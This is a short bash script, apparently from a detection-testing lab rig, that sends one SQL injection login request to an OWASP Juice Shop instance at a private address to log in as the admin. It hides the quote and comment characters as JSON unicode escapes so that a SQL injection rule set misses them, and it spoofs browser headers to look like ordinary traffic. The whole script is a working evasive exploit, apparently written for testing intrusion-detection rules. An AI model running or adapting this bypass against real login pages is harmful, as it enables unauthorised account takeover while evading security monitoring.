#!/usr/bin/env bash
# ATK-03 variant b (SYS-23, D-237): the login SQL injection with a tamper a SQLi rule set misses. The
# quote and the comment are sent as JSON unicode escapes (backslash-u0027, backslash-u002d twice), so the
# raw body holds no ' and no --; the shop's JSON parser turns them back into `admin@juice-sh.op'--`, which
# comments out the password check. One request, a browser's user agent and headers, aimed at the admin.
# Runs inside the rig's tools container only (recording/record.sh).
# tool: curl 8.x
# label: quiet: one login injection, quote and comment as JSON unicode escapes, browser user agent
set -eu
# Built from chr() so no editor or tool along the way turns the escapes back into the characters.
python3 - > /tmp/body.json <<'PY'
esc = "".join(chr(92) + "u%04x" % ord(c) for c in chr(39) + "--")
print('{"email":"admin@juice-sh.op%s","password":"x"}' % esc, end="")
PY
curl -s -X POST http://10.66.0.10/rest/user/login \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Accept-Language: en-GB,en;q=0.9' \
  -H 'Referer: https://juice-sh.op/' \
  -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' \
  --data-binary @/tmp/body.json
echo
